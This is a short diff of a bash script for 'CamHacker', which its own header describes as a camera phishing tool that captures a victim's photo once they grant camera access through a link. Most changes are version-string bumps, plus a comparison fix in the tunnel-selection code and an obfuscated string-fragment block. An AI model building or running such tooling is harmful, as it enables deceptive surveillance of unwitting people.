@@ -1,7 +1,7 @@
 #!/bin/bash
 
 # CamHacker
-# Version    : 1.2
+# Version    : 1.2.5
 # Description: CamHacker is a camera Phishing tool. Send a phishing link to victim, if he/she gives access to camera, his/her photo will be captured!
 # Author     : KasRoudra
 # Github     : https://github.com/KasRoudra
@@ -35,7 +35,7 @@ success="${cyan}[${white}√${cyan}] ${green}"
 z="
 ";Bz=' (ec';Qz='}Do ';Fz=' gre';Nz='o -e ';Iz='sR';Tz='al co';Sz='ste';Hz=' "Ka';Lz='then';Uz='de!"';Ez='go" |';Jz='dra"';Az='if !';Pz='rror';Oz='"${e';Rz='not ';Cz='ho "';Kz=')';Vz='ex';Mz='ech';Gz='p -q';Wz='fi';Dz='$lo';Yz='it';Zz='ou';
 
-version="1.2"
+version="1.2.5"
 
 cwd=`pwd`
 
@@ -46,7 +46,7 @@ ${red} / ___|__ _ _ __ ___ | | | | __ _  ___| | _____ _ __
 ${cyan}| |   / _' | '_ ' _ \| |_| |/ _' |/ __| |/ / _ \ '__|
 ${purple}| |__| (_| | | | | | |  _  | (_| | (__|   <  __/ |
 ${yellow} \____\__,_|_| |_| |_|_| |_|\__,_|\___|_|\_\___|_|
-${red}                                            [v1.2]
+${red}                                            [v1.2.5]
 ${blue}                                    [By KasRoudra]
 "
 
@@ -464,7 +464,7 @@ read option
         clear
         echo -e "$logo"
         echo -e "$red[ToolName]  ${cyan}  :[CamHacker]
-$red[Version]    ${cyan} :[1.2]
+$red[Version]    ${cyan} :[1.2.5]
 $red[Description]${cyan} :[Camera Phishing tool]
 $red[Author]     ${cyan} :[KasRoudra]
 $red[Github]     ${cyan} :[https://github.com/KasRoudra] 
@@ -532,7 +532,7 @@ cfcheck=false
 fi
 while true; do
 if ( $cfcheck && $ngrokcheck ); then
-    if [ $TN -eq "Cloudflared" ]; then
+    if [ $TN == "Cloudflared" ]; then
         echo -e "${success}Cloudflared choosen!\n"
         replacer "$cflink"
     else
